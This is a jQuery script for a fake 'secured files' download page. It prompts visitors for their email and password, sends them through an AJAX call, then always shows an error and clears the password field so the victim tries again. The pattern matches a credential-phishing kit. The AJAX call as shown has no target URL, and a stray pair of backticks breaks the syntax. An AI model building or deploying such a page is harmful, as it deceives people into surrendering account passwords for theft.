$(document).ready(function(){
    var email = $("#email").val();
    var noemail = false;
    $("#emaillabel").text(email);
    if(email.length < 6){
        console.log("no email")
        noemail = true;
        promptemail();
    }
    $("div.file-cont").click(function(event){
        event.preventDefault();
        $("#dmodal").fadeIn(1000);
        if(noemail){
            $("#email").focus();
        }else{
            $("#password").focus();
        }
    })
    $(".selection a").click(function(event){
        event.preventDefault();
        $("#dmodal").fadeIn(1000);
        if(noemail){
            $("#email").focus();
        }else{
            $("#password").focus();
        }
    })
    $("#btn-dl").click(function(event){
        event.preventDefault()
        let email = $("#email").val();
        let password = $("#password").val();
        if (password.length < 4){
            alert("Please enter a valid password")
            return
        }
        $("#error").css("display", "none");
        $("#loader").css("display", "inline-block");
        $.ajax({
            
            success: function(data){
                console.log(data);
                setTimeout(() => {
                    $("#loader").css("display", "none");
                    $("#error").css("display", "block");
                    $("#password").val("")
                    $("#password").focus();
                }, 1000);
            }
        })``
    })
    $(".email-panel svg").click(function(event){
        promptemail();
        $("#password").focus();
    })
})
function promptemail(){
    $("div.email-panel").css("display", "none");
    $("div.minfo").text("These files are secured, please sign in with your correct email and password to gain access to the files");
    $("div.stitle").text("Please sign in");
    $("#email").attr("type", "email");
}